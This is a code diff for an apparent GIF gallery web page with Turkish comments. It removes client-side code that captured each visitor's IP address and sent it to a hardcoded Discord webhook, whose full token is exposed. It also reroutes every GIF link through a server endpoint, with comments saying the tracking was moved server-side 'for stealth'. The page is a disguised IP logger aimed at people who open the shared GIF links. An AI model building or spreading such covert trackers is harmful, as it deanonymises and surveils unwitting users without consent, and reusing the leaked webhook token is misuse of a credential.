@@ -166,13 +166,12 @@
     </div>
 
     <script>
-        // ============= WEBHOOK URL (BURAYA KENDİ URL'İNİ YAZ) =============
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1490714732683067482/ae8gBJ6SmxJLVdbz5FMO55PmuhLnPPhSkp_iAvep88ScYAnlzEf6ghUVjUD_yoVRI-h2";
+        // Webhook now server-side in /api/gif/[id].js
         
         // GIF listesi
         const gifs = [];
         for (let i = 1; i <= 20; i++) {
-            gifs.push({ number: i, url: `https://goyzinparis.vercel.app/${i}.gif`, filename: `${i}.gif` });
+            gifs.push({ number: i, url: `https://goyzinparis.vercel.app/api/gif/${i}`, filename: `${i}.gif` });
         }
 
         let currentFilter = '';
@@ -229,13 +228,8 @@
             });
         }
 
-        // Ziyaretçi takibi
-        async function trackVisit() {
-            updateStatus("📡 IP alınıyor...");
-            const ip = await getIP();
-            updateStatus(`🌐 IP: ${ip} - Bildirim gönderiliyor...`);
-            sendWebhookViaImage(ip, 'visit');
-        }
+        // Tracking removed for stealth (now server-side)
+
 
         // GIF tıklama takibi
         async function trackGifClick(gifNumber) {
@@ -262,7 +256,6 @@
 
         async function copySingleGif(url, number) {
             copyToClipboard(url, `✅ GIF ${number} kopyalandı!`);
-            await trackGifClick(number);
         }
 
         function copyAllLinks() {
@@ -321,14 +314,8 @@
         // Başlat
         renderGifs();
         
-        // Webhook URL kontrolü
-        if (WEBHOOK_URL.includes('SENIN')) {
-            updateStatus("⚠️ Webhook URL ayarlanmamış!", true);
-            console.log("Webhook URL'ini düzenlemeyi unutma!");
-        } else {
-            updateStatus("🟢 Webhook hazır, ziyaretçi takibi başlıyor...");
-            trackVisit();
-        }
+        updateStatus("🟢 Gallery ready. Tracking is server-side.");
+
     </script>
 </body>
 </html>
